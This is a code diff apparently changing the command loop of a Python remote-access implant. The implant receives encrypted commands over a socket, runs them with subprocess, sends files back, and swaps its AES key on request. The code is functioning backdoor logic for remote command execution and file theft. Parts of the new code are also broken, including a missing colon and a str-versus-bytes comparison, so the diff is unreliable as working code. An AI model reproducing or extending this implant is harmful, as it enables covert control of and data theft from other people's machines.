@@ -55,8 +55,12 @@ def main():
             data = get_data(conn, buff)
             if data == 0:
                 break
-            received str(do_decrypt(data).strip(), 'utf-8')
-            command = received.split(' ')
+            received = str(do_decrypt(data).strip(), 'utf-8')
+            if 'aeskey' in received:
+                command = ast.literal_eval(received)
+            else:
+                command = received.split(' ')
+            print(command)
             if 'cmd' in command:
                 del command[0]
                 output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
@@ -67,11 +71,9 @@ def main():
                 with open(command[1]) as f:
                     tmp = f.read()
                 sendit(conn, do_encrypt(bytes(tmp)))
-            elif 'aeskey' in command:
-                message = ast.literal_eval(message)
-                print(message)
-                aeskey = message[1]
-                aesiv = message[2]
+            elif command[0] == b'aeskey'
+                aeskey = command[1]
+                aesiv = command[2]
                 sendit(conn, do_encrypt('Updated AES key\n'))
         except socket.error as err:
             print("{0}\n".format(err))
